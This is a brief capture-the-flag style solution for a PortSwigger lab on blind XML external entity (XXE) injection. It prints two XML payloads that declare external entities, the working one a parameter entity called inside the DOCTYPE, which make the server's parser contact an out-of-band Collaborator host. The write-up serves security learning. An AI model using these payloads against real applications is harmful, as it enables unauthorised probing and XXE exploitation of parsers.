# Lab: Blind XXE with out-of-band interaction via XML parameter entities

**Link**: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

**Solution**:

Like previous lab, but it prevent to call these `Entities` inside xml

<p align="center" width="100%">
  <img src="image1.png" width="800" hight="500"/>
</p>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY test SYSTEM "http://jpcqdakp0a8wgyp718gtwgv07rdi1bp0.oastify.com" >
]>
<stockCheck>
	<productId>&test;</productId> // didn't work if you call it here
	<storeId>1</storeId> 
</stockCheck>
```

so you can call it inside the DOCTYPE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % test SYSTEM "http://jpcqdakp0a8wgyp718gtwgv07rdi1bp0.oastify.com" >
%test;
]>
<stockCheck>
	<productId>3</productId>
	<storeId>1</storeId> 
</stockCheck>
```

<p align="center" width="100%">
  <img src="image1.png" width="800" hight="500"/>
</p>

<p align="center" width="100%">
  <img src="image2.png" width="800" hight="500"/>
</p>

